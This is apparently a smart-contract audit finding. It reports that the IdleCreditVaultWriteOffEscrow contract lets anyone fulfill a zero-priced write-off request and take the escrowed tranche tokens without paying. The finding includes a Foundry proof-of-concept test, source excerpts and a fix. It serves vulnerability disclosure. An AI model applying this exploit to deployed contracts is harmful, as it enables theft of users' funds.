### Title
Zero-priced write-off requests allow anyone to steal escrowed tranche tokens - (File: contracts/IdleCreditVaultWriteOffEscrow.sol)

### Summary
`createWriteOffRequest` validates that `amount` is nonzero but accepts `underlyingsRequested == 0`. [1](#0-0)  Because `fullfillWriteOffRequest` is permissionless and only requires `_underlyings >= currentRequest.underlyings`, an arbitrary EOA can fulfill the request with zero underlying and receive all escrowed tranche tokens. [2](#0-1) 

### Finding Description
A lender calls `createWriteOffRequest` while the epoch is running and escrows a nonzero tranche-token amount. [3](#0-2)  The function stores the caller-supplied `underlyingsRequested` without rejecting zero. [4](#0-3)  During fulfillment, `currentRequest.tranches != _tranches || _underlyings < currentRequest.underlyings` is the only request-value check. [5](#0-4)  Therefore, a request for `10000e18` tranches and `0` underlying can be fulfilled with `_underlyings == 0`, after which the escrow transfers `10000e18` tranche tokens to the fulfiller. [6](#0-5) 

### Impact Explanation
The attacker permanently steals the full escrowed tranche balance of any zero-priced request at no underlying-token cost. [6](#0-5)  For example, an LP that accidentally requests `0` USDC for `10000e18` tranche tokens loses all `10000e18` tranche tokens, while the attacker pays no underlying and no fee because both `_underlyings` and `_totFee` are zero. [7](#0-6)  This breaks fair exchange: escrowed tranche tokens are released without the corresponding payment expected by the write-off mechanism. [8](#0-7) 

### Likelihood Explanation
Exploitation requires a lender to enter `underlyingsRequested = 0`, but that input is accepted and the vulnerable request can be monitored and drained by any EOA. [1](#0-0) [9](#0-8)  The attacker does not need to be the borrower, owner, manager, KYC-approved lender, or holder of any prior request. [9](#0-8)  No existing access control, nonzero-payment check, or epoch condition prevents the zero-payment fulfillment. [2](#0-1) 

### Recommendation
Reject zero-priced write-off requests in `createWriteOffRequest` by requiring `underlyingsRequested > 0`, consistent with the existing `amount == 0` check. [1](#0-0)  As defense in depth, `fullfillWriteOffRequest` should also require `currentRequest.underlyings != 0` before deleting the request and transferring tranche tokens. [10](#0-9) 

### Proof of Concept
Add this test to `test/foundry/IdleCreditVaultWriteOffEscrow.t.sol`:

```solidity
function testPocZeroUnderlyingRequestDrainsTranches() external {
  address attacker = makeAddr('attacker');
  uint256 requestTranches = 10000e18;

  uint256 lpTranchePre = tranche.balanceOf(LP);
  uint256 lpUnderlyingPre = underlying.balanceOf(LP);

  // LP accidentally creates a request asking for zero underlying.
  vm.prank(LP);
  escrow.createWriteOffRequest(requestTranches, 0);

  (
    uint256 storedTranches,
    uint256 storedUnderlyings
  ) = escrow.userRequests(LP);
  assertEq(storedTranches, requestTranches);
  assertEq(storedUnderlyings, 0);

  // Any EOA can fulfill it for zero underlying and take all tranches.
  vm.prank(attacker);
  escrow.fullfillWriteOffRequest(LP, requestTranches, 0);

  assertEq(tranche.balanceOf(attacker), requestTranches);
  assertEq(tranche.balanceOf(LP), lpTranchePre - requestTranches);
  assertEq(underlying.balanceOf(attacker), 0);
  assertEq(underlying.balanceOf(LP), lpUnderlyingPre);
}
```

### Citations

**File:** contracts/IdleCreditVaultWriteOffEscrow.sol (L86-101)
```text
  function createWriteOffRequest(uint256 amount, uint256 underlyingsRequested) external nonReentrant {
    // can request write off only when epoch is running
    if (!IdleCDOEpochVariant(idleCDOEpoch).isEpochRunning()) revert EpochNotRunning();
    // cannot request write off with 0 tranche tokens
    if (amount == 0) revert NotAllowed();

    // get tranche tokens from user
    IERC20Detailed(tranche).safeTransferFrom(msg.sender, address(this), amount);
    // get current write-off request
    WriteOffRequest memory currentRequest = userRequests[msg.sender];
    // update user requests
    userRequests[msg.sender] = WriteOffRequest({
      tranches: currentRequest.tranches + amount,
      underlyings: currentRequest.underlyings + underlyingsRequested
    });
    pendingUnderlyings += underlyingsRequested;
```

**File:** contracts/IdleCreditVaultWriteOffEscrow.sol (L118-151)
```text
  /// @notice fulfill the write-off request by buying the escrowed tranche tokens
  /// @param _user address of the user that made the write-off request
  /// @param _tranches amount of tranche tokens to transfer
  /// @param _underlyings amount of underlyings to transfer
  /// @dev this function can be called by any wallet
  function fullfillWriteOffRequest(address _user, uint256 _tranches, uint256 _underlyings) external nonReentrant {
    // get current write-off request
    WriteOffRequest memory currentRequest = userRequests[_user];
    // check if the user has a write-off request
    if (currentRequest.tranches == 0) revert Is0();
    // check if the request matches at least the expected values (borrower can choose to overpay if needed, but not underpay)
    if (currentRequest.tranches != _tranches || _underlyings < currentRequest.underlyings) {
      revert WrongRequest();
    }

    // Existing upgraded escrows can have legacy requests that were never added to pendingUnderlyings.
    pendingUnderlyings -= pendingUnderlyings >= currentRequest.underlyings ? currentRequest.underlyings : pendingUnderlyings;
    delete userRequests[_user];

    IERC20Detailed underlyingToken = IERC20Detailed(underlying);
    // transfer underlyings requested from the fulfiller to this contract
    underlyingToken.safeTransferFrom(msg.sender, address(this), _underlyings);
    // check if the exit fee is set and if so, apply it
    uint256 _exitFee = exitFee;
    uint256 _totFee;
    if (_exitFee > 0) {
      _totFee = (_underlyings * _exitFee) / FULL_VALUE;
      // transfer exit fee to the feeReceiver
      underlyingToken.safeTransfer(feeReceiver, _totFee);
    }
    // transfer the remaining underlyings to the user
    underlyingToken.safeTransfer(_user, _underlyings - _totFee);
    // transfer tranche tokens to fulfiller
    IERC20Detailed(tranche).safeTransfer(msg.sender, _tranches);
```
